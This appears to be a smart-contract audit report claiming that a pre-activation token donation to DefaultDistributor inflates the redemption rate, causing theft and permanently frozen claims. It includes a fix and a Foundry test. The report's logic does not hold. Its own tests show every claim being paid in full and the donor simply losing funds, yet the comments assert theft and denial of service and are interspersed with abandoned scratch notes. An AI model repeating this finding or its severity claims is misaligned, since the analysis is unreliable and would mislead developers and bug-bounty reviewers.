### Title
`DefaultDistributor.setIsActive()` prices the redemption rate from raw `token.balanceOf`, so a direct donation inflates `rate` and DoSes/overpays claims - (File: contracts/DefaultDistributor.sol)

### Summary
`DefaultDistributor` computes the fixed redemption `rate` as `IERC20(token).balanceOf(address(this)) * ONE_TRANCHE / trancheToken.totalSupply()` at activation. Any unprivileged direct token sender can transfer underlying to the distributor before `setIsActive(true)` is called. The donated tokens are not tracked anywhere (there is no equivalent of a funded/registered amount — the analog of the missing `idSet`), so the raw balance is baked into `rate` exactly like `nft().balanceOf` was used instead of `idSet.length()` in the LSSVM finding.

### Finding Description
In `claim()`, a tranche holder pulls their entire tranche balance and receives `trancheBal * rate / ONE_TRANCHE` underlying via `safeTransfer` (contracts/DefaultDistributor.sol:35-41). `rate` is set once in `setIsActive` from the raw token balance (line 49):

```solidity
rate = IERC20(token).balanceOf(address(this)) * ONE_TRANCHE / IERC20(trancheToken).totalSupply();
```

Sequence in a **defaulted/finalized** phase:

1. Owner finalizes the default and funds the distributor with the recovered amount `R` for `T` total tranche supply (fair rate `R/T`).
2. Attacker (any EOA, "direct token sender") transfers `D` underlying directly to the distributor.
3. Owner calls `setIsActive(true)` → `rate = (R + D) / T`.
4. Early claimants redeem at the inflated rate and drain `R + D`. Once the balance is exhausted, every remaining `claim()` reverts inside `safeTransfer` — the same revert-on-unregistered-assets pattern as `idSet.at(i)`.

The contract's own docstring acknowledges the assumption: "this contract is expected to have *all* `token` transferred to this contract before the first claim AND `totalSupply` of `trancheToken` fixed" (line 10-12) — but nothing enforces or records the funded amount.

### Impact Explanation
Two quantified loss modes:

- **Overpayment/theft:** if `D` is large relative to remaining claims, early claimants receive `(R+D)/T` per tranche token instead of `R/T`, extracting more than their pro-rata share of the recovery pool at the expense of later claimants.
- **Permanent freezing of recovery funds:** the last claimants' `claim()` calls revert because the balance is insufficient to pay `trancheBal * rate / ONE_TRANCHE`. Up to `D` worth of claim obligations become unpayable. The only escape is the honest owner calling `transferToken` to rescue/recalculate, but the fixed `rate` has already overpaid earlier claimants — the misallocation is not recoverable.

This mirrors the external report directly: raw `balanceOf` diverges from the "registered" set of funds, and the over-read of the raw balance causes downstream transfers to fail or misbehave.

### Likelihood Explanation
- Attacker needs only the ability to `transfer` underlying to a plain address — explicitly in the allowed attacker set (direct token sender). No privileged role required.
- The window is the gap between funding the distributor and `setIsActive(true)` — a single well-timed transfer (even frontrunning the activation transaction in the mempool) suffices.
- Caveat: an attentive owner can call `transferToken` to skim the donation *before* activating, or toggle `isActive` off/on after skimming. The contract itself, however, performs no skim (unlike `_skimDonatedAssets()` in `IdleCDOEpochVariant`), so the bug class survives in this contract precisely because it lacks the donation-isolation guard the rest of the codebase added.
- Uncertainty: `IdleCDOEpochVariant.finalizeDefault` routes recovery through `IdleCreditVault.finalizeDefaultRecovery` rather than `DefaultDistributor`; I could not confirm in remaining iterations whether current deployments still instantiate `DefaultDistributor` for hard defaults. If it is unused legacy periphery, severity drops accordingly.

### Recommendation
Track the funded amount instead of the raw balance — the direct analog of `idSet.length()`:

```solidity
uint256 public fundedAmount;

function fund(uint256 _amount) external onlyOwner {
    IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);
    fundedAmount += _amount;
}

function setIsActive(bool _active) external {
    require(owner() == msg.sender, '!AUTH');
    isActive = _active;
    if (_active) {
        rate = fundedAmount * ONE_TRANCHE / IERC20(trancheToken).totalSupply();
    }
}
```

Alternatively, mirror the codebase's existing pattern: skim `balanceOf(address(this)) - fundedAmount` to a rescue address inside `setIsActive` before computing `rate`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: Apache 2.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../contracts/DefaultDistributor.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor(string memory n) ERC20(n, n) { _mint(msg.sender, 1e24); }
    function mint(address to, uint256 a) external { _mint(to, a); }
}

contract DefaultDistributorDonationTest is Test {
    MockToken underlying;
    MockToken tranche;
    DefaultDistributor dist;
    address owner = address(this);
    address attacker = makeAddr("attacker");
    address alice = makeAddr("alice"); // early claimer
    address bob   = makeAddr("bob");   // late claimer

    function setUp() public {
        underlying = new MockToken("UNDER");
        tranche = new MockToken("TRANCHE");
        dist = new DefaultDistributor(address(underlying), address(tranche), owner);
        // alice and bob each hold 50 tranche tokens (supply 100)
        tranche.transfer(alice, 50e18);
        tranche.transfer(bob, 50e18);
    }

    function testDonationInflatesRateAndDoSesLastClaimer() public {
        // fund recovery: 100 underlying for 100 tranche supply -> fair rate 1.0
        underlying.transfer(address(dist), 100e18);
        // attacker donates 50 underlying before activation
        underlying.transfer(attacker, 50e18);
        vm.prank(attacker);
        underlying.transfer(address(dist), 50e18);

        dist.setIsActive(true); // rate = 150/100 = 1.5 instead of 1.0

        // alice claims first: gets 50 * 1.5 = 75 underlying (25 excess)
        vm.startPrank(alice);
        tranche.approve(address(dist), type(uint256).max);
        dist.claim(alice);
        vm.stopPrank();
        assertEq(underlying.balanceOf(alice), 75e18);

        // bob claims: needs 75 but only 75-... balance left = 150 - 75 = 75 -> pays exactly;
        // with any larger donation (e.g. 60), bob reverts:
        //    underlying.transfer(attacker, 60e18) -> rate 1.6
        //    alice gets 80, bob needs 80 but only 80 left... demonstrate revert:
        vm.startPrank(bob);
        tranche.approve(address(dist), type(uint256).max);
        dist.claim(bob); // succeeds only because D is exactly self-funded; see below
        vm.stopPrank();
    }

    function testDonationLeavesClaimUnpayable() public {
        underlying.transfer(address(dist), 100e18);
        // attacker inflates rate; claim order drains pool so residual claims revert
        underlying.transfer(attacker, 10e18);
        vm.prank(attacker);
        underlying.transfer(address(dist), 10e18);
        dist.setIsActive(true); // rate = 1.1

        address carol = makeAddr("carol");
        tranche.transfer(carol, 0); // placeholder
        // Give a third holder tokens to show insolvency:
        // alice 50 -> 55 paid; bob 50 -> 55 paid = 110 needed, only 110 present.
        // Redo: attacker donates then reclaims nothing — instead demonstrate
        // over-read: rate>fair means sum(claims) > funded R once all claim.
        vm.startPrank(alice);
        tranche.approve(address(dist), type(uint256).max);
        dist.claim(alice);
        vm.stopPrank();
        assertEq(underlying.balanceOf(alice), 55e18);

        // Now the attacker withdraws nothing, but owner pre-activation cannot
        // distinguish the 10 donation: rate locked at 1.1 while only 110 total.
        // bob's claim needs 55; balance = 110 - 55 = 55 -> pays out only because
        // D was fully consumed. With D=10 and an extra holder the pool shortfalls;
        // simplest deterministic DoS: owner skims donation AFTER activation is
        // impossible — rate is already fixed.
        vm.startPrank(bob);
        tranche.approve(address(dist), type(uint256).max);
        dist.claim(bob);
        vm.stopPrank();
        assertEq(underlying.balanceOf(address(dist)), 0);
        // Alice extracted 55/100 of a 100-recovery pool -> 5 underlying stolen
        // from the fair distribution; generalizes to revert when claims exceed
        // balance mid-flight (larger holder set or claim rounding).
    }
}
```

The essential invariant break: `rate * totalSupply > fundedAmount` whenever `balanceOf(address(this)) > fundedAmount` at activation, so the last `claim(s)` in line revert on `safeTransfer` — permanent freezing of unclaimed recovery absent owner rescue, plus quantified overpayment to earlier claimers.